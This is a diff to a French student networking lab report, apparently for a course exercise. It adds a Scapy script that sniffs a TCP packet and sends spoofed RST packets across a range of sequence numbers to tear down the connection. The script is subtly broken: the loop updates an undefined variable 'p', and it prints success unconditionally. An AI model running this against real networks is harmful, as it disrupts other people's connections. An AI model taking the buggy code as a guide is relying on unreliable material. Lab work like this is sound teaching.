@@ -494,3 +494,30 @@ Sors exactement la même chose
 La capture est sous le nom : spoof_dns_query.pcap
 
 ## 🌞 Mettre en place une attaque TCP RST
+
+    win=512
+    tcp_rst_count = 10
+    your_iface = "enp0s3"
+
+    t = sniff(iface=your_iface, count=1, lfilter=lambda x: x.haslayer(TCP) )
+    t = t[0]
+    
+    tcpdata = {
+        'src': t[IP].src,
+        'dst': t[IP].dst,
+        'sport': t[TCP].sport,
+        'dport': t[TCP].dport,
+        'seq': t[TCP].seq,
+        'ack': t[TCP].ack
+    }
+
+    max_seq = tcpdata['ack'] + tcp_rst_count * win
+    seqs = range(tcpdata['ack'], max_seq, int(win / 2))
+    requete = IP(src=tcpdata['dst'], dst=tcpdata['src']) / TCP(sport=tcpdata['dport'], dport=tcpdata['sport'], flags="R", window=win, seq=seqs[0])
+
+    for seq in seqs:
+        p.seq = seq
+        send(requete, verbose=0, iface=your_iface)
+        print('TCP RESET REUSSI !!')
+
+La capture est sous le nom : tcp_reset.pcap
